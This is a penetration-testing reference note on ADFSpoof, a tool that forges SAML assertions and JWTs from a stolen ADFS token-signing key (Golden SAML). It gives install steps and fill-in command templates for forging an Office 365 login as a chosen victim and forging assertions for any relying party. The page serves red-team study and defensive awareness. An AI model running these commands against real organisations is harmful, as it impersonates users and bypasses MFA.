# ADFSpoof

**Tags:** `#adfspoof` `#adfs` `#goldensaml` `#saml` `#jwt` `#federation`

Python tool (Mandiant) that forges SAML assertions and JWTs from the ADFS token-signing key extracted by [[Tools/AD/ADFSDump|ADFSDump]] — the forging half of a **Golden SAML** attack. Given the signing key and issuer, it mints an assertion for an arbitrary user/claims that a relying party (Microsoft 365, other SaaS) will accept as genuine, bypassing authentication and MFA. The open-source alternative to AADInternals' `New-AADIntSAMLToken`.

**Source:** https://github.com/mandiant/ADFSpoof
**Install:** `git clone https://github.com/mandiant/ADFSpoof && pip install -r requirements.txt`.

```bash
# Forge an Office365 SAML assertion from ADFSDump's key output
python3 ADFSpoof.py -b <ADFSDump_key_blob> -s <sts.domain.com> o365 \
  --upn <victim@domain.com> --objectguid <b64-objectGUID>

# Generic SAML2 for an arbitrary relying party
python3 ADFSpoof.py -b key.txt -s <sts> saml2 --endpoint <acs-url> --nameid <UPN> --assertions <claims>
```

---

> [!note] **See also** — [[Services/Active Directory/ADFS|ADFS]] — Golden SAML forging from an extracted token-signing key (pairs with [[Tools/AD/ADFSDump|ADFSDump]]); AADInternals equivalent covered there too.

---

*Created: 2026-09-25*
*Updated: 2026-09-25*
*Model: claude-opus-4-8*
